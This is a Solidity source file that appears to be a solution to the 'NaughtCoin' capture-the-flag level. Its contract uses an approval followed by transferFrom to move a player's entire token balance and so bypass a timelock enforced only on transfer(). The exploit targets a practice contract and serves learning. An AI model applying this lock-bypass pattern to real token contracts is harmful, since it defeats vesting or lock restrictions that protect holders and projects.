// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function transfer(address _to, uint256 _value) external returns (bool);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
    function approve(address _spender, uint256 _value) external returns (bool);
}

contract NaughtCoinSolver {
    function solve(address naughtCoin, address player) external {
        INaughtCoin token = INaughtCoin(naughtCoin);
        uint256 balance = token.balanceOf(player);
        
        // The player must approve this contract first externally
        // Then we can call transferFrom to bypass the timelock
        require(token.transferFrom(player, address(this), balance), "Transfer failed");
    }
    
    function getTokenBalance(address token) external view returns (uint256) {
        return INaughtCoin(token).balanceOf(address(this));
    }
}